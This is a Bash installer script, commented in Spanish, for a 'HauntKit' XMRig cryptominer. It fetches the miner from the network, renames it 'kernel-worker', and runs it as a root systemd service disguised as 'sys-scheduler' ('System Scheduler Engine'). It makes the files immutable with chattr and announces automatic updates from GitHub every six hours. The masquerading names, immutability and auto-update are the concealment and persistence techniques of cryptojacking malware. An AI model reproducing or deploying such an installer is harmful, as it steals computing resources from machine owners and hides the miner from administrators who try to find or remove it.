#!/bin/bash
# ════════════════════════════════════════════════════════
#  HauntKit — Instalador del Minero
#  Instala XMRig, configura el servicio, protege archivos
#  Uso:  sudo bash mine-install.sh         (1ra vez)
#        sudo bash mine-install.sh --update (actualizar)
# ════════════════════════════════════════════════════════

# ─── Colores ───
RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'
YELLOW='\033[1;33m'; NC='\033[0m'

UPDATE_MODE=false
[ "$1" = "--update" ] && UPDATE_MODE=true

# ─── Solo root ───
if [ "$(id -u)" -ne 0 ]; then
    echo -e "${RED}[!] Debes ejecutar como root (sudo)$NC"
    exit 1
fi

# ─── Rutas fijas del sistema ───
REPO_DIR="/opt/hauntkit/repo"
INSTALL_DIR="/opt/hauntkit"
CONFIG_DST="$INSTALL_DIR/mine-config.env"
XMRIG_DIR="$INSTALL_DIR/xmrig"
XMRIG_BIN="$XMRIG_DIR/kernel-worker"

if $UPDATE_MODE; then
    echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║        Actualizando HauntKit Miner      ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
else
    echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║      Instalador de Minería HauntKit     ║${NC}"
    echo -e "${CYAN}║         CYBER HAUNT & SPECTRE           ║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
    echo ""
fi

# ─── Asegurar repo en /opt/hauntkit/repo ───
if [ -d "$REPO_DIR/.git" ]; then
    echo -e "${GREEN}[✓] Repo encontrado en $REPO_DIR${NC}"
elif [ -f "$(dirname "$0")/../../VERSION" ]; then
    # Estamos ejecutando desde un clone, copiarlo a /opt/hauntkit/repo
    SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
    HAUNTKIT_SRC="$(cd "$SCRIPT_DIR/../.." && pwd)"
    echo -e "${YELLOW}[*] Repo origen: $HAUNTKIT_SRC${NC}"
    echo -e "${YELLOW}[*] Copiando a $REPO_DIR...${NC}"
    mkdir -p "$(dirname "$REPO_DIR")"
    rm -rf "$REPO_DIR" 2>/dev/null
    cp -a "$HAUNTKIT_SRC" "$REPO_DIR"
    echo -e "${GREEN}[✓] Repo copiado a $REPO_DIR${NC}"
else
    echo -e "${YELLOW}[*] Repo no encontrado, clonando desde GitHub...${NC}"
    mkdir -p "$(dirname "$REPO_DIR")"
    git clone https://github.com/CyberRo/HauntKit.git "$REPO_DIR" 2>&1 | tail -1
    echo -e "${GREEN}[✓] Repo clonado en $REPO_DIR${NC}"
fi

# ─── Config: NO sobrescribir si existe (modo update o reinstalación) ───
if ! $UPDATE_MODE; then
    CONFIG_SRC="$REPO_DIR/tools/utils/mine-config.env"
    CONFIG_EXAMPLE="$REPO_DIR/tools/utils/mine-config.env.example"

    if [ ! -f "$CONFIG_SRC" ]; then
        if [ -f "$CONFIG_EXAMPLE" ]; then
            echo -e "${YELLOW}[*] Usando mine-config.env.example como config${NC}"
            CONFIG_SRC="$CONFIG_EXAMPLE"
        fi
    fi

    if [ -f "$CONFIG_SRC" ]; then
        # Solo copiar si NO existe ya en el destino
        if [ ! -f "$CONFIG_DST" ]; then
            cp "$CONFIG_SRC" "$CONFIG_DST"
            chmod 600 "$CONFIG_DST"
            chown root:root "$CONFIG_DST"
            echo -e "${GREEN}[✓] Config instalada y protegida${NC}"
        else
            echo -e "${YELLOW}[*] Config existente preservada (no se sobrescribe)${NC}"
        fi
    fi
else
    echo -e "${YELLOW}[*] Modo update: config no modificada${NC}"
fi

# ─── Crear directorios ───
echo -e "\n${CYAN}[*] Preparando directorios...${NC}"
mkdir -p "$XMRIG_DIR" "$INSTALL_DIR"
chmod 755 "$INSTALL_DIR"

# ─── Copiar service script (desde el repo) ───
cp "$REPO_DIR/tools/utils/mine-service.sh" "$INSTALL_DIR/mine-service.sh"
chmod 755 "$INSTALL_DIR/mine-service.sh"
chown root:root "$INSTALL_DIR/mine-service.sh"
echo -e "${GREEN}[✓] Service script actualizado${NC}"

# ─── Copiar monitor ───
cp "$REPO_DIR/tools/utils/mine-monitor.sh" "$INSTALL_DIR/mine-monitor.sh"
chmod 755 "$INSTALL_DIR/mine-monitor.sh"
echo -e "${GREEN}[✓] Monitor script copiado${NC}"

# ─── Copiar VERSION ───
cp "$REPO_DIR/VERSION" "$INSTALL_DIR/VERSION"
echo -e "${GREEN}[✓] Versión: $(cat "$REPO_DIR/VERSION")${NC}"

# ─── Descargar XMRig si no existe ───
if [ ! -f "$XMRIG_BIN" ]; then
    echo -e "\n${YELLOW}[*] Descargando XMRig...${NC}"
    LATEST=$(curl -sL https://api.github.com/repos/xmrig/xmrig/releases/latest \
        | grep -oP '"tag_name": "\K[^"]+')
    [ -z "$LATEST" ] && LATEST="v6.22.2"

    cd /tmp
    wget -q "https://github.com/xmrig/xmrig/releases/download/$LATEST/xmrig-${LATEST#v}-linux-static-x64.tar.gz" -O xmrig.tar.gz

    if [ -f "xmrig.tar.gz" ]; then
        TAR_DIR=$(tar tzf xmrig.tar.gz | head -1 | cut -d/ -f1)
        tar xf xmrig.tar.gz
        if [ -f "$TAR_DIR/xmrig" ]; then
            cp "$TAR_DIR/xmrig" "$XMRIG_BIN"
            chmod 755 "$XMRIG_BIN"
            chown root:root "$XMRIG_BIN"
            rm -rf "$TAR_DIR" xmrig.tar.gz
            echo -e "${GREEN}[✓] XMRig descargado como kernel-worker${NC}"
        fi
    fi
fi

if [ ! -f "$XMRIG_BIN" ]; then
    echo -e "${YELLOW}[!] kernel-worker no encontrado. Copia el binario manualmente.${NC}"
fi

# ─── Crear/actualizar servicio systemd ───
echo -e "\n${CYAN}[*] Configurando servicio systemd...${NC}"

SERVICE_NAME="sys-scheduler"

cat > /etc/systemd/system/$SERVICE_NAME.service << 'EOF'
[Unit]
Description=System Scheduler Engine
After=network.target

[Service]
Type=simple
ExecStart=/opt/hauntkit/mine-service.sh
Restart=on-failure
RestartSec=30
User=root
Nice=10
IOSchedulingClass=best-effort
IOSchedulingPriority=7

[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload 2>/dev/null
systemctl enable $SERVICE_NAME 2>/dev/null

echo -e "${GREEN}[✓] Servicio: $SERVICE_NAME${NC}"

# ─── Proteger archivos (solo en primera instalación) ───
echo -e "\n${CYAN}[*] Protegiendo archivos...${NC}"

if [ -f "$XMRIG_BIN" ]; then
    chattr +i "$XMRIG_BIN" 2>/dev/null && \
        echo -e "${GREEN}[✓] kernel-worker inmutable${NC}" || \
        echo -e "${YELLOW}[!] kernel-worker sin protección extra${NC}"
fi

chattr +i "$INSTALL_DIR/mine-service.sh" 2>/dev/null && \
    echo -e "${GREEN}[✓] mine-service.sh inmutable${NC}"

if [ -f "$CONFIG_DST" ]; then
    chmod 600 "$CONFIG_DST"
    chown root:root "$CONFIG_DST"
    echo -e "${GREEN}[✓] Config: solo root${NC}"
fi

# ─── Sistema de auto-update completo ¡YA funciona!
echo -e "\n${GREEN}[✓] Auto-update: activo (cada ~6h el servicio revisa GitHub)${NC}"

# ─── Resumen ───
echo ""
echo -e "${CYAN}╔══════════════════════════════════════════╗${NC}"
if $UPDATE_MODE; then
    echo -e "${CYAN}║       Actualización completada          ║${NC}"
else
    echo -e "${CYAN}║         Instalación completada           ║${NC}"
fi
echo -e "${CYAN}╚══════════════════════════════════════════╝${NC}"
echo ""
echo "  Versión:     $(cat "$INSTALL_DIR/VERSION" 2>/dev/null || echo '?')"
echo "  Servicio:    $SERVICE_NAME"
echo "  Binario:     $XMRIG_BIN"
echo "  Config:      $CONFIG_DST"
echo "  Logs:        $XMRIG_DIR/miner.log"
echo "  Repo:        $REPO_DIR"
echo ""
echo "  Comandos:"
echo "    Iniciar:   systemctl start $SERVICE_NAME"
echo "    Detener:   systemctl stop $SERVICE_NAME"
echo "    Estado:    systemctl status $SERVICE_NAME"
echo "    Monitorear: bash $INSTALL_DIR/mine-monitor.sh"
echo ""

if ! $UPDATE_MODE; then
    read -rp "¿Iniciar el servicio ahora? (s/N): " START_NOW
    if [[ "$START_NOW" =~ ^[sS]$ ]]; then
        systemctl start $SERVICE_NAME
        echo -e "${GREEN}[✓] Servicio iniciado${NC}"
        echo -e "${YELLOW}  Minero activo solo entre $START_HOUR:00 y $END_HOUR:00${NC}"
    fi
fi

echo ""
echo -e "${GREEN}¡Listo, CYBER HAUNT!${NC} 🔥👻"
